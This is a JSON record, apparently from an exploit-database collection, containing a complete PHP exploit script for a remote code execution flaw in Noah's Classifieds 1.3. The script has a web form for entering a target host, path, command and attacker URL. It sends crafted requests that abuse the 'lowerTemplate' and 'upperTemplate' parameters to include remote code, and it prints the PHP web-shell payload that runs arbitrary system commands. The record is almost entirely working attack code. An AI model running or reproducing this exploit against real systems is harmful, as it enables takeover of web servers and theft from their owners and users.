{
  "id": "1521",
  "title": "Noahs Classifieds 1.3 - &#039;lowerTemplate&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "<?php\r\n#               Noah's classifieds 1.3 Remote Code Execution                  #\r\n#                                by trueend5                                  #\r\n#                  Computer Security Researchers Institute                    #\r\n#                           [http://www.KAPDA.ir]                             #\r\n#                        *** Functions From rgod ***                          #\r\n#                       Condition:register_globals=On                         #\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 5);\r\nob_implicit_flush (1);\r\n\r\necho'<html>\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">\r\n<title>Noah`s classifieds 1.3 Remote Code Execution</title>\r\n</head>\r\n\r\n<body bgcolor=\"#FFCCFF\">\r\n\r\n<p align=\"center\"><font size=\"4\" color=\"#0000FF\">Noah`s classifieds 1.3 Remote\r\nCode Execution</font></p>\r\n<p class=\"Stile6\" align=\"center\"><font size=\"3\" color=\"#FF0000\">by trueend5</font></p>\r\n<p align=\"center\"><font size=\"4\" color=\"#008000\">Computer Security Researchers\r\nInstitute</font></p>\r\n<font SIZE=\"3\">\r\n<p align=\"center\"><a href=\"http://www.kapda.ir\">KAPDA</a></p>\r\n<p align=\"center\"><img border=\"0\" src=\"http://irannetjob.com/pics/ph-logo.png\" width=\"120\" height=\"121\"></p>\r\n</font>\r\n<table width=\"90%\">\r\n  <tbody>\r\n    <tr>\r\n      <td width=\"43%\" align=\"left\">\r\n        <form name=\"form1\" action=\"'.$SERVER[PHP_SELF].'\" method=\"post\">\r\n          <p><input name=\"host\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> hostname (ex:www.sitename.com)</span></p>\r\n          <p><input name=\"path\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> path (ex: /classifieds/\r\n          or just / )</span></p>\r\n          <p><input name=\"CMD\" size=\"20\"> <span class=\"Stile5\"><font color=\"#FF0000\">*</font> specify a\r\n          command</span></p>\r\n          <p><input name=\"LOCATION\" size=\"20\"><span class=\"Stile5\"><font color=\"#FF0000\">*</font> remote\r\n          location ( ex: http://www.somesite.com/sys.php)</span></p>\r\n          <p><input name=\"port\" size=\"20\"><span class=\"Stile5\">specify a port&nbsp;\r\n          (default is 80)</span></p>\r\n          <p><input name=\"proxy\" size=\"20\"><span class=\"Stile5\">send exploit\r\n          through an HTTP proxy (ip:port)</span></p>\r\n          <p align=\"center\"> <span class=\"Stile5\"><font color=\"#FF0000\">&nbsp;&nbsp;\r\n          * </font>fields are required</span></p>\r\n          <p align=\"center\"><span class=\"Stile5\">-----------------------------------------------------------------------------------------------</span></p>\r\n          \r\n          <p><input type=\"submit\" value=\"Start\" name=\"Submit\"></p>\r\n        </form>\r\n      </td>\r\n    </tr>\r\n  </tbody>\r\n</table>\r\n</body></html>';\r\nfunction show($headeri)\r\n{\r\n  $ii=0;$ji=0;$ki=0;$ci=0;\r\n  echo '<table border=\"0\"><tr>';\r\n  while ($ii <= strlen($headeri)-1){\r\n    $datai=dechex(ord($headeri[$ii]));\r\n    if ($ji==16) {\r\n      $ji=0;\r\n      $ci++;\r\n      echo \"<td>&nbsp;&nbsp;</td>\";\r\n      for ($li=0; $li<=15; $li++) {\r\n        echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t}\r\n      $ki=$ki+16;\r\n      echo \"</tr><tr>\";\r\n    }\r\n    if (strlen($datai)==1) {\r\n      echo \"<td>0\".$datai.\"</td>\";\r\n    }\r\n    else {\r\n      echo \"<td>\".$datai.\"</td> \";\r\n    }\r\n    $ii++;$ji++;\r\n  }\r\n  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {\r\n    echo \"<td>&nbsp&nbsp</td>\";\r\n  }\r\n  for ($li=$ci*16; $li<=strlen($headeri); $li++) {\r\n    echo \"<td>\".$headeri[$li].\"</td>\";\r\n  }\r\n  echo \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket() \r\n{\r\n  global $proxy, $host, $port, $packet, $html, $proxy_regex;\r\n  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\r\n  if ($socket < 0) {\r\n    echo \"socket_create() failed: reason: \" . socket_strerror($socket) . \"<br>\";\r\n  }\r\n  else {\r\n    $c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {echo 'Not a valid proxy';\r\n    die;\r\n    }\r\n  echo \"OK.<br>\";\r\n  echo \"Attempting to connect to \".$host.\" on port \".$port.\"...<br>\";\r\n  if ($proxy=='') {\r\n    $result = socket_connect($socket, $host, $port);\r\n  }\r\n  else {\r\n    $parts =explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $result = socket_connect($socket, $parts[0],$parts[1]);\r\n  }\r\n  if ($result < 0) {\r\n    echo \"socket_connect() failed.\\r\\nReason: (\".$result.\") \" . socket_strerror($result) . \"<br><br>\";\r\n  }\r\n  else {\r\n    echo \"OK.<br><br>\";\r\n    $html= '';\r\n    socket_write($socket, $packet, strlen($packet));\r\n    echo \"Reading response:<br>\";\r\n    while ($out= socket_read($socket, 2048)) {$html.=$out;}\r\n    echo nl2br(htmlentities($html));\r\n    echo \"Closing socket...\";\r\n    socket_close($socket);\r\n  }\r\n  }\r\n}\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.htmlentities($host); die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);echo nl2br(htmlentities($html));\r\n}\r\n\r\n$host=$_POST[host];\r\n$path=$_POST[path];\r\n$port=$_POST[port];\r\n$CMD=$_POST[CMD];\r\n$LOCATION=$_POST[LOCATION];\r\n\r\n\r\nif (($host<>'') and ($path<>'') and ($CMD<>'') and ($LOCATION<>''))\r\n{\r\n  $port=intval(trim($port));\r\n  if ($port=='') {$port=80;}\r\n  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {die('Error... check the path!');}\r\n  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n  $host=str_replace(\"\\r\\n\",\"\",$host);\r\n  $path=str_replace(\"\\r\\n\",\"\",$path);\r\n  $CMD=urlencode($CMD);\r\n\r\n  $packet=\"GET \".$p.\"index.php?com=\".$CMD.\"&lowerTemplate=\".$LOCATION.\" HTTP/1.1\\r\\n\";\r\n  $packet.=\"User-Agent: Shareaza v1.x.x.xx\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  if (eregi(\"kapda\",$html)) {echo \"Exploit succeeded\"; die;}\r\n                           else {echo \"Trying Step 2...<br>\";}\r\n\r\n  $packet=\"GET \".$p.\"index.php?com=\".$CMD.\"&upperTemplate=\".$LOCATION.\" HTTP/1.1\\r\\n\";\r\n  $packet.=\"User-Agent: SnoopRob/x.x\\r\\n\";\r\n  $packet.=\"Host: \".$host.\"\\r\\n\";\r\n  $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n  show($packet);\r\n  sendpacketii($packet);\r\n  if (eregi(\"kapda\",$html)) {echo \"Exploit succeeded\"; }\r\n                           else {echo \"Exploit failed...\";}\r\n}\r\nelse\r\n{echo \"Note: on remote location which supports php, prepare this code in<br>\r\n        http://remote_location/sys.php<br>\";\r\n echo  nl2br(htmlentities(\"\r\n<?php\r\n        echo '<?php echo\\\"kapda\\\"; ini_set(\\\"max_execution_time\\\",0);\r\n        \\$com = \\$_GET[\\\"com\\\"];\r\n        system (\\\"\\$com\\\"); ?>';\r\n?>\r\n\r\n        Or on remote location that Doesnt support php, prepare this code in\r\n        http://remote_location/sys.php\r\n\r\n\r\n<?php\r\n echo\\\"kapda\\\";\r\n ini_set(\\\"max_execution_time\\\",0);\r\n \\$com = \\$_GET[\\\"com\\\"];\r\n system (\\\"\\$com\\\");\r\n?>\r\n        \"));}\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-02-22]",
  "url": "https://www.exploit-db.com/exploits/1521"
}